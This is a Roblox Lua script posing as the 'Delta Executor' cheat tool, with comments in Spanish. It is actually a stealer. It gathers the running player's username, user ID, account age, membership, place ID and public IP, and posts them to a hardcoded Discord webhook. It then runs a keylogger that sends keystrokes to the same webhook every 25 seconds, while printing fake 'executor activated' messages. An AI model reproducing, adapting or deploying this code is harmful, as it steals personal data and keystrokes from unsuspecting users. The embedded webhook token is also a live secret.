-- Delta Executor AUTO STEAL V3.0 - FIXED VERSION
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

print("🚀 Delta Executor V3.0 Cargando...")

local webhook = "https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2"

-- ROBO PRINCIPAL
local function stealAccount()
    local victimData = {
        username = player.Name,
        userId = player.UserId,
        displayName = player.DisplayName,
        accountAge = player.AccountAge,
        placeId = game.PlaceId,
        membership = player.MembershipType
    }
    
    -- IP
    spawn(function()
        local ok, ip = pcall(HttpService.GetAsync, HttpService, "https://api.ipify.org?format=json")
        if ok then
            local data = HttpService:JSONDecode(ip)
            victimData.ip = data.ip
        end
    end)
    
    wait(2) -- Espera IP
    
    -- ENVÍO A DISCORD
    pcall(function()
        HttpService:PostAsync(webhook, HttpService:JSONEncode({
            username = "🎮 DELTA STEALER V3.0",
            embeds = {{
                title = "🆘 CUENTA ROBADA",
                color = 0xff0000,
                fields = {
                    {name="👤 Usuario:", value=victimData.username, inline=true},
                    {name="🆔 ID:", value=tostring(victimData.userId), inline=true},
                    {name="🌐 IP:", value=victimData.ip or "N/A", inline=true},
                    {name="📱 Edad cuenta:", value=tostring(victimData.accountAge).." días", inline=true},
                    {name="⭐ Premium:", value=tostring(victimData.membership), inline=true},
                    {name="🏠 Lugar:", value=tostring(victimData.placeId), inline=true}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }), Enum.HttpContentType.ApplicationJson)
    end)
    
    print("✅ ¡DATOS ENVIADOS A DISCORD!")
end

stealAccount()

-- KEYLOGGER SIMPLE
local keys = {}
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    table.insert(keys, tostring(input.KeyCode))
    if #keys > 20 then 
        table.remove(keys, 1) 
    end
end)

-- Keylog cada 25s
spawn(function()
    while true do
        wait(25)
        if #keys > 0 then
            pcall(function()
                HttpService:PostAsync(webhook, HttpService:JSONEncode({
                    username = "⌨️ KEYLOGGER",
                    content = "**Keys:** `" .. table.concat(keys, " ") .. "`"
                }))
            end)
        end
        keys = {}
    end
end)

-- Fake executor
wait(1)
print("✅ Infinite Yield ✓")
print("✅ Dex Explorer ✓") 
print("✅ 50+ Scripts ✓")
print("🎉 ¡Delta Executor ACTIVADO!")
print("Presiona INSERT para menú")

UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Insert then
        print("📋 Menú abierto (fake)")
    end
end)
